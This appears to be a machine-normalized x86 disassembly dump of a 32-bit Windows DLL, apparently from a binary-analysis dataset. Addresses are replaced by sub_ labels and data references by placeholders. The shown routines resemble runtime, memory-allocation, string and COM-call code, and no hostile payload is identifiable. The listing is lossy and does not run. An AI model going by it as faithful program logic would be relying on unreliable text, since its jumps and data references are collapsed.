lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_100195b1
push 0x14
push r--data
call sub_1007fad0
or [ ebp - 0x20 ] 0xffffffff
call sub_1002d269
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_1002387b
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_10080ad7
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_1005f1fb
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_1007fb15
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_1005c4ab
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_1001b2d2
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_1001b2d2
pop ecx
push 0xd
call sub_1002f3c9
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10019712
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_1001b2d2
pop ecx
sub_10019750
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10019794
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
push [ ebp + 0x8 ]
call sub_10061657
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_10019802
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push [ ebx + 0x28 ]
lea eax [ ebx + 0x20 ]
push eax
push [ ebx + 0x8 ]
call sub_10015a73
add esp 0xc
test eax eax
jne r-xdata
push [ ebx + 0x8 ]
call sub_1006044e
add esp 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x40 ]
fld [ ebx + 0x18 ]
and eax 0xffffffe3
fstp [ ebp - 0x50 ]
or eax 0x3
mov [ ebp - 0x40 ] eax
push 0x0
lea eax [ ebx + 0x20 ]
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x28 ]
push [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_100299fd
add esp 0x1c
push eax
call sub_1000909e
mov [ esp ] 0xffff
push [ ebx + 0x28 ]
call sub_1001fcf4
fld [ ebx + 0x20 ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebx + 0x28 ]
fld [ ebx + 0x20 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebx + 0x18 ]
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push eax
call sub_100490fd
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_100198e0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
test edx edx
jne r-xdata
push ebx
push esi
push edi
mov edi [ ecx + 0x10 ]
cmp eax edi
jae r-xdata
cmp eax [ ecx + 0x10 ]
jbe r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
sub edi eax
cmp edx edi
ja r-xdata
mov esp ebp
pop ebp
retn 0xc
mov esi 0x1
sub esi edx
add edi esi
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
lea ebx [ ecx + eax ]
mov eax [ ebp + 0x8 ]
movsx ecx [ eax ]
push edi
push ecx
push ebx
call sub_1007f310
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov ecx [ ecx ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push edx
push eax
push esi
call sub_100021f0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov ecx [ ebp + 0x8 ]
movsx edx [ ecx ]
sub ebx esi
lea edi [ edi + ebx - 0x1 ]
push edi
push edx
lea ebx [ esi + 0x1 ]
push ebx
call sub_1007f310
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
pop edi
mov eax esi
pop esi
sub eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ecx ]
sub_1001998a
push 0x38
mov eax sub_100852a6
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1004ad92
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1000c882
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_1002be90
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_10019a40
push ebp
mov ebp esp
sub esp 0xf8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov eax [ ebp + 0xc ]
mov [ ebp - 0xf0 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc0 ] ecx
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0xbc ] edx
mov edx [ ebp + 0x18 ]
mov [ ebp - 0xf8 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc8 ] ecx
mov ecx [ ebp + 0x20 ]
mov [ ebp - 0xb4 ] edx
mov edx [ ebp + 0x24 ]
mov [ ebp - 0xc4 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0xcc ] ecx
mov ecx [ ebp + 0x2c ]
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0xf4 ] edx
mov edx [ ebp + 0x30 ]
mov [ ebp - 0xdc ] eax
mov eax [ ebp + 0x34 ]
mov [ ebp - 0xb8 ] ecx
mov ecx [ ebp + 0x38 ]
xor edi edi
mov [ ebp - 0xec ] edx
mov edx [ ebp + 0x3c ]
mov [ ebp - 0xe4 ] eax
mov eax [ ebp + 0x40 ]
mov [ ebp - 0xd0 ] ecx
mov ecx [ ebp + 0x44 ]
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ ebp - 0xd8 ] edx
mov [ ebp - 0xe0 ] eax
mov [ ebp - 0xe8 ] ecx
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x6e
call sub_1002f620
mov eax [ esi ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0x97
call sub_1002f620
mov [ esi + 0x4 ] edi
push eax
call sub_10002bd3
add esp 0x4
mov [ esi + 0x4 ] eax
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0xd4 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov edx [ ebp - 0xd4 ]
push edx
push ebx
push eax
mov [ esi ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi ] edi
lea edx [ ebp - 0xa8 ]
mov eax 0xfe
call sub_1002f620
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
mov ebx [ ebp - 0xc0 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0xf0 ]
cmp eax edi
je r-xdata
push r--data
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push ebx
push r--data
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] edi
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xc0 ]
push ebx
push ecx
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] edi
lea edx [ ebp - 0x2c ]
mov eax 0xc3
call sub_1002f620
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push eax
mov [ esi + 0x8 ] eax
call sub_1007f580
mov ebx [ ebp - 0xbc ]
add esp 0xc
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0xfa
call sub_1002f620
push eax
call sub_10002bd3
add esp 0x4
mov [ esi + 0x10 ] eax
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xbc ]
push ebx
push ecx
push eax
mov [ esi + 0xc ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] edi
lea edx [ ebp - 0x28 ]
mov eax 0xb
call sub_1002f620
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
mov ebx [ ebp - 0xc8 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0xf8 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x1c
call sub_1002f620
mov eax [ esi + 0x18 ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xc8 ]
push ebx
push ecx
push eax
mov [ esi + 0x14 ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
lea edx [ ebp - 0x28 ]
mov eax 0xaa
call sub_1002f620
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xb4 ]
push ebx
push ecx
push eax
mov [ esi + 0x18 ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x18 ] edi
mov ebx [ ebp - 0xb4 ]
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0xe3
call sub_1002f620
push eax
call sub_10002bd3
add esp 0x4
mov [ esi + 0x20 ] eax
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xc4 ]
push ebx
push ecx
push eax
mov [ esi + 0x1c ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x1c ] edi
mov ebx [ ebp - 0xc4 ]
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0x3d
call sub_1002f620
push eax
call sub_10002bd3
add esp 0x4
mov [ esi + 0x2c ] eax
jmp r-xdata
mov eax [ ebp - 0xf4 ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0xcc ]
cmp eax edi
je r-xdata
mov [ esi + 0x28 ] edi
push eax
call sub_10002bd3
add esp 0x4
mov [ esi + 0x28 ] eax
jmp r-xdata
mov eax [ ebp - 0xdc ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0xec ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x30 ]
cmp eax edi
je r-xdata
mov ebx [ ebp - 0xb8 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0xe4 ]
cmp eax edi
je r-xdata
push eax
call sub_10002bd3
add esp 0x4
mov [ esi + 0x34 ] eax
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xb8 ]
push ebx
push ecx
push eax
mov [ esi + 0x30 ] eax
call sub_1007f580
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x30 ] edi
lea edx [ ebp - 0x34 ]
mov eax 0xc4
call sub_1002f620
push eax
call sub_10002bd3
add esp 0x4
mov [ esi + 0x24 ] eax
jmp r-xdata
mov eax [ ebp - 0xd8 ]
cmp eax edi
je r-xdata
push eax
call sub_10002bd3
add esp 0x4
mov [ esi + 0x38 ] eax
mov eax [ ebp - 0xd0 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0x72
call sub_1002f620
push eax
call sub_10002bd3
cdq
add esp 0x4
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] edx
jmp r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x99
call sub_1002f620
push eax
call sub_10002bd3
add esp 0x4
mov [ esi + 0x4c ] eax
jmp r-xdata
mov eax [ ebp - 0xe0 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x85
call sub_1002f620
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov [ esi + 0x48 ] 0x989680
mov eax esi
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x40
push eax
call sub_10002bd3
mov [ esi + 0x48 ] eax
add esp 0x4
mov eax esi
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x40
mov eax [ ebp - 0xe8 ]
cmp eax edi
je r-xdata
sub_10019f50
push ebp
mov ebp esp
push 0xffffffff
push sub_1008836c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
push eax
sub esp 0x1c
mov [ ebp - 0x94 ] ecx
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x9c ] esp
mov [ ebp - 0x98 ] ecx
mov ecx esp
xor ebx ebx
push 0xffffffff
push ebx
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] bl
call sub_10037cf0
sub esp 0x1c
mov [ ebp - 0x4 ] ebx
mov edx [ ebp - 0x98 ]
mov ecx esp
mov [ ebp - 0xa0 ] esp
push 0xffffffff
push ebx
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] bl
call sub_10037cf0
mov eax [ ebp - 0x94 ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x98 ] esp
push 0xffffffff
push ebx
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] bl
call sub_10037cf0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x94 ] esp
push 0xffffffff
mov [ ebp - 0x4 ] 0x2
push ebx
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push edi
mov [ ecx ] bl
call sub_10037cf0
lea edi [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100652f0
add esp 0x74
mov edi eax
push 0xffffffff
push ebx
push edi
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_1002d970
push 0xffffffff
push ebx
lea ecx [ edi + 0x1c ]
push ecx
lea ecx [ esi + 0x1c ]
call sub_1002d970
mov dx [ edi + 0x38 ]
push 0xffffffff
push ebx
lea eax [ edi + 0x3c ]
mov [ esi + 0x38 ] dx
push eax
lea ecx [ esi + 0x3c ]
call sub_1002d970
push 0xffffffff
push ebx
lea ecx [ edi + 0x58 ]
push ecx
lea ecx [ esi + 0x58 ]
call sub_1002d970
mov dl [ edi + 0x74 ]
mov [ esi + 0x74 ] dl
mov eax [ edi + 0x78 ]
mov [ esi + 0x78 ] eax
mov ecx [ edi + 0x7c ]
mov [ esi + 0x7c ] ecx
lea esi [ ebp - 0x90 ]
call sub_10051380
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1001a0d0
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x6c ] edi
call sub_1003dc60
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x5c ]
push edx
mov [ ebp - 0x5c ] ebx
mov ecx [ eax ]
push esi
push eax
mov eax [ ecx + 0xdc ]
call eax
push esi
mov edi eax
call [ LocalFree@IAT ]
cmp edi ebx
jge r-xdata
or eax 0xffffffff
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x5c ]
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x68 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x68 ]
cmp eax ebx
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
xor esi esi
cmp eax esi
jle r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0xe9
call sub_1002f620
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x5c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x5c ]
lea edx [ ebp - 0x60 ]
push edx
mov [ ebp - 0x60 ] esi
mov ecx [ eax ]
push ebx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov ecx [ ebp - 0x60 ]
cmp ecx esi
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x20
lea edx [ ebp - 0x64 ]
push edx
mov [ ebp - 0x64 ] esi
call sub_10041330
test eax eax
je r-xdata
inc ebx
cmp ebx [ ebp - 0x68 ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov esi [ ebp - 0x64 ]
mov edi [ ebp - 0x6c ]
push esi
add edi 0x130
call sub_100669f0
test esi esi
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp ecx esi
je r-xdata
mov eax [ ebp - 0x60 ]
xor esi esi
cmp eax esi
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x112
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
call sub_1002f620
sub_1001a233
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_100176b0
dec [ ebp + 0x18 ]
jne r-xdata
sub_1001a260
push ebp
mov ebp esp
push 0xffffffff
push sub_10089719
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xa4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0xa8 ] cl
push r--data
xor edi edi
mov ecx rw-data
call sub_100449d0
test eax eax
je r-xdata
mov eax 0x1
mov eax [ rw-data ]
push r--data
mov ecx rw-data
call sub_100449d0
test eax eax
je r-xdata
mov eax [ rw-data ]
push r--data
mov ecx rw-data
call sub_100449d0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov edi 0x8
cmp [ rw-data ] edi
jae r-xdata
mov ecx [ rw-data ]
push eax
lea esi [ ebp - 0x30 ]
call sub_1001e650
add esp 0x4
mov edx esi
push r--data
push edx
mov [ ebp - 0x4 ] 0x0
call sub_10044a40
add esp 0x8
test al al
je r-xdata
mov eax rw-data
mov eax [ rw-data ]
cmp [ rw-data ] edi
jae r-xdata
mov ecx esi
call sub_10003250
mov eax 0x2
jmp r-xdata
mov ecx [ rw-data ]
push eax
lea esi [ ebp - 0x4c ]
call sub_1001e650
add esp 0x4
mov eax esi
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10044a40
add esp 0x8
test al al
je r-xdata
mov eax rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ rw-data ] edi
jae r-xdata
mov ecx esi
call sub_10003250
lea ecx [ ebp - 0x30 ]
call sub_10003250
mov eax 0x3
jmp r-xdata
mov ecx [ rw-data ]
push eax
lea esi [ ebp - 0x84 ]
call sub_1001e650
add esp 0x4
mov ecx esi
push r--data
push ecx
mov [ ebp - 0x4 ] 0x2
call sub_10044a40
add esp 0x8
test al al
je r-xdata
mov eax rw-data
mov eax [ rw-data ]
cmp [ rw-data ] edi
jae r-xdata
mov ecx esi
call sub_10003250
lea ecx [ ebp - 0x4c ]
call sub_10003250
lea ecx [ ebp - 0x30 ]
call sub_10003250
mov eax 0x4
jmp r-xdata
mov ecx [ rw-data ]
push eax
lea esi [ ebp - 0x68 ]
call sub_1001e650
add esp 0x4
mov [ ebp - 0x4 ] 0x3
mov esi [ ebp - 0x54 ]
mov edi [ ebp - 0x68 ]
mov ebx 0x10
mov eax edi
cmp esi ebx
jae r-xdata
mov eax rw-data
push 0x0
push r--data
push eax
call sub_100021f0
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x68 ]
sete al
test al al
sete al
test al al
je r-xdata
cmp [ ebp - 0x58 ] eax
setne al
test eax eax
lea ecx [ ebp - 0x68 ]
call sub_10003250
lea ecx [ ebp - 0x84 ]
call sub_10003250
lea ecx [ ebp - 0x4c ]
call sub_10003250
lea ecx [ ebp - 0x30 ]
call sub_10003250
mov eax 0x5
jmp r-xdata
mov eax edi
cmp esi ebx
jae r-xdata
push eax
call [ StrToIntA@IAT ]
mov esi [ ebp - 0x84 ]
cmp [ ebp - 0x70 ] ebx
jae r-xdata
lea eax [ ebp - 0x68 ]
mov edx [ ebp - 0x4c ]
cmp [ ebp - 0x38 ] ebx
jae r-xdata
lea esi [ ebp - 0x84 ]
mov ecx [ ebp - 0x30 ]
cmp [ ebp - 0x1c ] ebx
jae r-xdata
lea edx [ ebp - 0x4c ]
push 0x0
push eax
push esi
push edx
push ecx
call sub_1000df50
add esp 0x14
push eax
lea ecx [ ebp - 0xa0 ]
call sub_10004c10
lea edx [ ebp - 0xa0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x4
call sub_10044a40
add esp 0x8
lea ecx [ ebp - 0xa0 ]
test al al
je r-xdata
lea ecx [ ebp - 0x30 ]
mov eax [ ebp - 0xa8 ]
push eax
lea edx [ ebp - 0xb8 ]
call sub_100227f0
add esp 0x4
mov esi eax
mov ebx [ ebp - 0xa4 ]
cmp ebx esi
je r-xdata
call sub_10003250
lea ecx [ ebp - 0x68 ]
call sub_10003250
lea ecx [ ebp - 0x84 ]
call sub_10003250
lea ecx [ ebp - 0x4c ]
call sub_10003250
lea ecx [ ebp - 0x30 ]
call sub_10003250
mov eax 0x6
jmp r-xdata
lea ebx [ ebp - 0xb8 ]
call sub_10023c70
lea ecx [ ebp - 0xa0 ]
call sub_10003250
lea ecx [ ebp - 0x68 ]
call sub_10003250
lea ecx [ ebp - 0x84 ]
call sub_10003250
lea ecx [ ebp - 0x4c ]
call sub_10003250
lea ecx [ ebp - 0x30 ]
call sub_10003250
xor eax eax
jmp r-xdata
call sub_10023c70
mov ecx [ esi ]
mov [ ebx ] ecx
mov edx [ esi + 0x4 ]
mov [ ebx + 0x4 ] edx
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
sub_1001a5e0
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebx + 0xb8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x4
jne r-xdata
mov edx [ ebp + 0x8 ]
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
push ecx
push 0x20000005
mov [ esi ] 0x0
mov eax [ ebx + 0xdc ]
push edx
call eax
